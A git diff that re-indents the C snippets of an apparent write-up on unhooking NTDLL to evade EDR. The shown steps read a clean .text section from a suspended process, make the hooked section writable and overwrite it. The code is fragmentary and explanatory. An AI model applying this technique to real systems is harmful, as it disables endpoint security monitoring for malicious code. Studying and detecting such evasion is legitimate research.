@@ -145,172 +145,172 @@ To do this, the following steps will be followed.
 
 ```c
 						...
-		_NtQueryInformationProcess ntQueryInformationProcess =
-			(_NtQueryInformationProcess)fpNtQueryInformationProcess;
-		/*Information del proceso suspendido para sacar la direccion del PEB*/
-		NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize);
+_NtQueryInformationProcess ntQueryInformationProcess =
+	(_NtQueryInformationProcess)fpNtQueryInformationProcess;
+/*Information del proceso suspendido para sacar la direccion del PEB*/
+NTSTATUS status = (*ntQueryInformationProcess)(hProc, 0, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwSize);
 
-		if (!NT_SUCCESS(status))
-		{
-			printf("Error: %d\n", GetLastError());
-			return 0;
-		}
-		unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
-		SIZE_T bytesRead;
-		/*Leo el PEB*/
-		BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
-		if (!bSuccess)
-		{
-			printf("Error: %d\n", GetLastError());
-			throw EXCEPTION_STACK_OVERFLOW;
-		}
-		/*Con el PEB me quedo con el address de la base de la imagen*/
-		LPVOID imageBase = pPeb.ImageBaseAddress;
-						...
+if (!NT_SUCCESS(status))
+{
+	printf("Error: %d\n", GetLastError());
+	return 0;
+}
+unsigned long long baseAddress = (unsigned long long)BasicInfo.PebBaseAddress;
+SIZE_T bytesRead;
+/*Leo el PEB*/
+BOOL bSuccess = ReadProcessMemory(hProc, (LPCVOID)baseAddress, &pPeb, sizeof(PEB), &bytesRead);
+if (!bSuccess)
+{
+	printf("Error: %d\n", GetLastError());
+	throw EXCEPTION_STACK_OVERFLOW;
+}
+/*Con el PEB me quedo con el address de la base de la imagen*/
+LPVOID imageBase = pPeb.ImageBaseAddress;
+				...
 ```
 
 4. Call VirtualQueryEx, searching all mapped regions with MEM_COMMIT & MEM_IMAGE state.
 
 ```c
-						...
-		int contador = 1;
-		/*Enumeramos las secciones del proceso*/
-		while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
+				...
+int contador = 1;
+/*Enumeramos las secciones del proceso*/
+while (VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION)))
+{
+	LPVOID oldaddr = addr;
+	if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE) /*Si una seccion es de tipo imagen*/
+	{
+		delete[] buffer;
+		buffer = new char[basic.RegionSize];
+		/*Leemos la memoria de esa seccion*/
+		bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
+		if (!bSuccess)
 		{
-			LPVOID oldaddr = addr;
-			if (basic.State == MEM_COMMIT && basic.Type == MEM_IMAGE) /*Si una seccion es de tipo imagen*/
-			{
-				delete[] buffer;
-				buffer = new char[basic.RegionSize];
-				/*Leemos la memoria de esa seccion*/
-				bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
-				if (!bSuccess)
-				{
-					printf("Error: %d\n", GetLastError());
+			printf("Error: %d\n", GetLastError());
 
-					return 0;
-				}
-						...
+			return 0;
+		}
+				...
 ```
 5. Those regions are readed, searching for magic bytes of PE file.
 
 ```c
-						...
-				bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
-				if (!bSuccess)
-				{
-					printf("Error: %d\n", GetLastError());
+		...
+bSuccess = ReadProcessMemory(hProc, basic.BaseAddress, buffer, basic.RegionSize, &bytesRead);
+if (!bSuccess)
+{
+	printf("Error: %d\n", GetLastError());
 
-					return 0;
-				}
-				for (unsigned int j = 0; j < bytesRead; j++)
-				{
-					/*Hay algun tramo de memoria con bytes magic de PE32*/
-					if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
-						...
+	return 0;
+}
+for (unsigned int j = 0; j < bytesRead; j++)
+{
+	/*Hay algun tramo de memoria con bytes magic de PE32*/
+	if (buffer[j] == 'M' && buffer[j + 1] == 'Z' && buffer[j + 3] == '\0' && buffer[j + 79] == 'h')
+		...
 ```
 
 6. Once the magic bytes are found, we check if this is the first time we found a PE in this loop, if this is the case, it will be the PE32 file of the executable, so we move the address to the end of that image, and go on.
 
 ```c
-						...
-						if (contador == 1)
-						{
-							if (j != 0)
-								addr = LPVOID((unsigned long long)addr + j);
-							if (j != 0)
-								bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
-							if (!bSuccess)
-							{
-								printf("Error final one: %d\n", GetLastError());
-								return 0;
-							}
-							PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
-							LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
-							PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
-							/*Ahi ese donde saco el tamano del PE32 para luego saltarmelo*/
-							addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
-							contador += 1;
-							goto continuar;
-						}
-						...
+...
+if (contador == 1)
+{
+	if (j != 0)
+		addr = LPVOID((unsigned long long)addr + j);
+	if (j != 0)
+		bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
+	if (!bSuccess)
+	{
+		printf("Error final one: %d\n", GetLastError());
+		return 0;
+	}
+	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
+	LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
+	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((unsigned long long)buffer + pDOSHeader->e_lfanew);
+	/*Ahi ese donde saco el tamano del PE32 para luego saltarmelo*/
+	addr = LPVOID((unsigned long long)addr + ntHeader->OptionalHeader.SizeOfImage);
+	contador += 1;
+	goto continuar;
+}
+...
 ```
 7. Once located the second PE image we know this is the NTDLL.
 
 8. We read the memory of that region, enumerating different sections of the DLL, until we locate .text section.
 
 ```c
-						...
+...
 
-						/*Si no fuese la primera posicion del iterador de la seccion, pues me reemplazo addr
-						por addr mas iterador*/
-						if (j != 0)
-							addr = LPVOID((unsigned long long)addr + j);
-						if (j != 0)
-							bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
-						if (!bSuccess)
-						{
-							printf("Error final one: %d\n", GetLastError());
-							return 0;
-						}
-						//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
-						/*Operaciones con las estructuras PE32 para sacar el numero de secciones de la DLL y donde empieza
-						en si la DLL y dicha seccion*/
-						PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
-						LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
-						PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);
+/*Si no fuese la primera posicion del iterador de la seccion, pues me reemplazo addr
+por addr mas iterador*/
+if (j != 0)
+	addr = LPVOID((unsigned long long)addr + j);
+if (j != 0)
+	bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize, &bytesRead);
+if (!bSuccess)
+{
+	printf("Error final one: %d\n", GetLastError());
+	return 0;
+}
+//printf("Found ntdll image in: 0x%x.\n", (LPVOID)((unsigned long long)basic.BaseAddress + j));
+/*Operaciones con las estructuras PE32 para sacar el numero de secciones de la DLL y donde empieza
+en si la DLL y dicha seccion*/
+PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)buffer;
+LPVOID ntdllBase = (LPVOID)mi2.lpBaseOfDll;
+PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((unsigned long long)buffer + pDOSHeader->e_lfanew);
 
 
-						for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) //iteramos las secciones
-						{
-							//Sacamos el nombre de cada seccion
-							PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
-							//Si es la seccion text estamos de suerte
-							if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
-						...
+for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) //iteramos las secciones
+{
+	//Sacamos el nombre de cada seccion
+	PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));
+	//Si es la seccion text estamos de suerte
+	if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
+...
 ```
 
 9. We get the size of the text section, copying the content of that in .text section of the NTDLL belonging to the parent process.
 
 ```c
-									...
-									unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
-									//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
-									unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
-									addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
-									//Comprobamos el tamano de memoria que podemos leer de ahi, para que no de por saco
-									VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
-									delete[] buffer;
+...
+unsigned long long size_section = hookedSectionHeader->Misc.VirtualSize;
+//Guardamos el addr de la seccion text (coincide con el addr de mi propia seccion text de mi dll, gracias microsoft!!
+unsigned long long hookedAddr = hookedSectionHeader->VirtualAddress;
+addr = LPVOID((unsigned long long)addr + hookedSectionHeader->VirtualAddress);
+//Comprobamos el tamano de memoria que podemos leer de ahi, para que no de por saco
+VirtualQueryEx(hProc, addr, &basic, sizeof(MEMORY_BASIC_INFORMATION));
+delete[] buffer;
 
 #ifdef _M_X64 
-									/*Ese numero es por tema de padding, sino anade byte nulls al final que no hacen falta*/
-									buffer = new char[basic.RegionSize - 2000];
-									/*Leemos la seccion text de la dll del proceso suspendido*/
-									bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
-									if (!bSuccess)
-									{
-										printf("Error reading the last: %d\n", GetLastError());
-										return 0;
-									}
-									//Por motivos de debug si quieres puedes dumpearla ;) 
-									/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
-									fwrite(buffer, bytesRead, 1, fp);
-									fclose(fp);*/
+/*Ese numero es por tema de padding, sino anade byte nulls al final que no hacen falta*/
+buffer = new char[basic.RegionSize - 2000];
+/*Leemos la seccion text de la dll del proceso suspendido*/
+bSuccess = ReadProcessMemory(hProc, addr, buffer, basic.RegionSize - 2000, &bytesRead);
+if (!bSuccess)
+{
+	printf("Error reading the last: %d\n", GetLastError());
+	return 0;
+}
+//Por motivos de debug si quieres puedes dumpearla ;) 
+/*FILE* fp = fopen("C:\\Temp\\log_text.txt", "wb+");
+fwrite(buffer, bytesRead, 1, fp);
+fclose(fp);*/
 
-									DWORD oldProtection, oldProtection2 = 0;
-									/*
-									Cambiamos el protect de esa zona para darnos permisos de escritura, y luego
-									finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
-									mi DLL hookeada por el EDR*/
+DWORD oldProtection, oldProtection2 = 0;
+/*
+Cambiamos el protect de esa zona para darnos permisos de escritura, y luego
+finalmente escribimos la DLL que habiamos leido antes en el proceso suspendido en
+mi DLL hookeada por el EDR*/
 
-									bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);
+bool isProtected = VirtualProtect((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), basic.RegionSize - 2000, PAGE_EXECUTE_READWRITE, &oldProtection);
 
-									/*¡¡Thanks to ired.team i didn´t lost my mind trying to calculate that address!!*/
-									/*https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++*/
+/*¡¡Thanks to ired.team i didn´t lost my mind trying to calculate that address!!*/
+/*https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++*/
 
 
-									memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
-									...
+memcpy((LPVOID)((unsigned long long)ntdllBase + (unsigned long long)hookedAddr), buffer, basic.RegionSize - 2000);
+...
 ```
 
 Let's debug in x64dbg this process, to see how the syscall of ZwQueueUserApcThread is cleaned after executing the POC.
